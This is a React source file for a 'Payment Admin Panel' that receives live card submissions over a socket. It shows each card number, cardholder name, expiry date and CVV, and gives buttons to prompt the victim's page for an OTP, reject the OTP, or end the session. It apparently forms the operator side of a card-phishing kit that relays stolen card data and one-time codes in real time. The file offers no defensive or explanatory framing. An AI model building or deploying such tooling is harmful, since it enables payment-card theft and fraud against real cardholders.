import React, { useState, useEffect } from 'react';
import { socket } from '../socket';

interface PaymentSession {
  sessionId: string;
  paymentData: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    cardholderName: string;
    timestamp: string;
  };
}

function AdminPanel() {
  const [sessions, setSessions] = useState<PaymentSession[]>([]);

  useEffect(() => {
    socket.connect();

    socket.on('new_payment', (data) => {
      setSessions(prev => [...prev, data]);
    });

    return () => {
      socket.off('new_payment');
      socket.disconnect();
    };
  }, []);

  const handleAction = (action: string, sessionId: string) => {
    socket.emit('admin_action', { action, sessionId });
    if (action === 'success' || action === 'fail') {
      setSessions(prev => prev.filter(session => session.sessionId !== sessionId));
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 p-8">
      <div className="max-w-6xl mx-auto">
        <h1 className="text-3xl font-bold mb-8">Payment Admin Panel</h1>
        
        <div className="grid gap-6">
          {sessions.map((session) => (
            <div key={session.sessionId} className="bg-white p-6 rounded-lg shadow-md">
              <div className="grid grid-cols-2 gap-4 mb-4">
                <div>
                  <p className="text-gray-600">Card Number</p>
                  <p className="font-medium">{session.paymentData.cardNumber}</p>
                </div>
                <div>
                  <p className="text-gray-600">Cardholder Name</p>
                  <p className="font-medium">{session.paymentData.cardholderName}</p>
                </div>
                <div>
                  <p className="text-gray-600">Expiry Date</p>
                  <p className="font-medium">{session.paymentData.expiryDate}</p>
                </div>
                <div>
                  <p className="text-gray-600">CVV</p>
                  <p className="font-medium">{session.paymentData.cvv}</p>
                </div>
                <div>
                  <p className="text-gray-600">Timestamp</p>
                  <p className="font-medium">{new Date(session.paymentData.timestamp).toLocaleString()}</p>
                </div>
              </div>
              
              <div className="flex gap-3">
                <button
                  onClick={() => handleAction('show_otp', session.sessionId)}
                  className="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600"
                >
                  Show OTP
                </button>
                <button
                  onClick={() => handleAction('wrong_otp', session.sessionId)}
                  className="bg-yellow-500 text-white px-4 py-2 rounded hover:bg-yellow-600"
                >
                  Wrong OTP
                </button>
                <button
                  onClick={() => handleAction('success', session.sessionId)}
                  className="bg-green-500 text-white px-4 py-2 rounded hover:bg-green-600"
                >
                  Success
                </button>
                <button
                  onClick={() => handleAction('fail', session.sessionId)}
                  className="bg-red-500 text-white px-4 py-2 rounded hover:bg-red-600"
                >
                  Fail
                </button>
              </div>
            </div>
          ))}
          
          {sessions.length === 0 && (
            <div className="text-center py-12 text-gray-500">
              No active payment sessions
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default AdminPanel;